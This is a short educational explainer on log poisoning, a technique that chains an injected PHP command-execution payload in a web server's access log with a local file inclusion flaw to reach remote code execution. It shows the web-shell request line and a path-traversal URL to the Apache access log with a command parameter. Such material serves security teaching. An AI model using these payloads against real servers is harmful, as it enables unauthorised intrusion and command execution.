Log Poisoning

A technique where malicious code is injected into a web server's access log, which is then included by a vulnerable LFI application to achieve Remote Code Execution.

Attack Chain

From Log to RCE

  • Step 1: Inject malicious PHP code into the web server's access log (e.g., via User-Agent).
  • Step 2: Use LFI to include the poisoned log file, triggering the execution of the injected code.
Key Takeaway

Log poisoning is a powerful LFI technique that leverages server logs to achieve RCE, turning data into executable code.

Example: Injecting & Executing

1. Inject Malicious PHP into Log

GET /<?php system($_GET['cmd']); ?> HTTP/1.0
User-Agent: MaliciousCode

This request will be logged, embedding the PHP payload.

2. Include Log & Execute Command

http://example.com/lfi.php?page=../../../../var/log/apache2/access.log&cmd=id

The LFI vulnerability includes the log, executing id command.
